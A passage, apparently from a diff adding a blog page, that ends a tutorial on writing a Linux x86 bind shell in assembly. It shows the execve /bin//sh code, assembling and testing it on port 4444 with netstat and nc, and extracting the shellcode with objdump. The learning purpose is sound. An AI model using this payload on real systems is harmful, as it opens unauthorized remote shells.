+        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">63</span>           <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
+        <span style="color:#a6e22e">inc</span> ecx               <span style="color:#75715e">; increment ecx to 2 for stderr</span>
+        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>              <span style="color:#75715e">; call sys_dup2</span>
+
+        <span style="color:#75715e">; sys_execve (execute /bin//sh upon connecting and pass the responses back to connector)</span>
+
+        <span style="color:#a6e22e">xor</span> ecx, ecx         <span style="color:#75715e">; clear value of ecx, args argument = 0</span>
+        <span style="color:#a6e22e">push</span> ecx             <span style="color:#75715e">; push a null to the stack to terminate our filename</span>
+        <span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x68732f2f</span>      <span style="color:#75715e">; push //sh to the stack (second part of /bin//sh)</span>
+        <span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x6e69622f</span>      <span style="color:#75715e">; push /bin to the stack (first part of /bin//sh</span>
+        <span style="color:#a6e22e">mov</span> ebx, esp         <span style="color:#75715e">; set ebx with the location of our file name on the stack</span>
+        <span style="color:#a6e22e">mov</span> edx, ecx         <span style="color:#75715e">; move null value for envp argument into edx</span>
+        <span style="color:#a6e22e">xor</span> eax, eax         <span style="color:#75715e">; clear value of eax</span>
+        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">11</span>          <span style="color:#75715e">; sets the value 11 which is the syscall number for sys_execve</span>
+        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>             <span style="color:#75715e">; call sys_execve</span>
+</code></pre></div><p>That should be the entire bind shell done. Lets assemble this and test it.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./nassemble.sh bindshell
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./bindshell
+</code></pre></div><p>Check if port 4444 is listening:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">netstat -antp
+</code></pre></div><p>Finally, connect to the listener and see if we have a shell:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nc -nv 127.0.0.1 <span style="color:#ae81ff">4444</span>
+id
+</code></pre></div><p><img src="http://i.imgur.com/0SGUFE1.png" alt=""></p>
+<p><strong>WIN, we have a working bind shell 100% written in assembly.</strong></p>
+<p>Lets take a look at our shellcode.</p>
+<p>Create a file called <code>getshell.sh</code> with the following code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+objdump -d ./$1|grep <span style="color:#e6db74">&#39;[0-9a-f]:&#39;</span>|grep -v <span style="color:#e6db74">&#39;file&#39;</span>|cut -f2 -d:|cut -f1-6 -d<span style="color:#e6db74">&#39; &#39;</span>|tr -s <span style="color:#e6db74">&#39; &#39;</span>|tr <span style="color:#e6db74">&#39;\t&#39;</span> <span style="color:#e6db74">&#39; &#39;</span>|sed <span style="color:#e6db74">&#39;s/ $//g&#39;</span>|sed <span style="color:#e6db74">&#39;s/ /\\x/g&#39;</span>|paste -d <span style="color:#e6db74">&#39;&#39;</span> -s |sed <span style="color:#e6db74">&#39;s/^/&#34;/&#39;</span>|sed <span style="color:#e6db74">&#39;s/$/&#34;/g&#39;</span>
+</code></pre></div><p>Make the file executable and pass your executable &lsquo;bindshell&rsquo; as an argument:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./getshell bindshell
+</code></pre></div><p><img src="http://i.imgur.com/zYfsAhM.png" alt=""></p>
+<p>Uh OH! Even though our shellcode worked, it&rsquo;s full of null bytes (<code>\x00</code>) which is bad news for us.</p>
+<p>In <a href="http://norsec0de.github.io/posts/part-3-cleaning-and-optimising-shellcode">Part 3: Cleaning and Optimising Shellcode</a> we will take a look at how to clean our shellcode and remove all the null bytes as well as look at some ways to reduce it&rsquo;s size.</p>
+<p>I hope you have learned a bit from reading this tutorial and feel more comfortable with assembly language as well as have some neat scripts to speed up your coding.</p>
+<p>Keep on sploiting,</p>
+<p>norsec0de</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="http://norsec0de.github.io/tags/assembly/">assembly</a></span>
+        <span class="tag"><a href="http://norsec0de.github.io/tags/shellcode/">shellcode</a></span>
+        <span class="tag"><a href="http://norsec0de.github.io/tags/tutorial/">tutorial</a></span>
+        
+    </p>
+
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="http://norsec0de.github.io/categories/shellcode/">shellcode</a></span>
+        <span class="tag"><a href="http://norsec0de.github.io/categories/tutorial/">tutorial</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+                <span><a href="http://norsec0de.github.io/">norsey</a></span>
+            
+            <span><a href="http://norsec0de.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>norsey's hideout</span>
+            <span>hugo</span>
+          </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="http://norsec0de.github.io/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+
+    </body>
+</html>
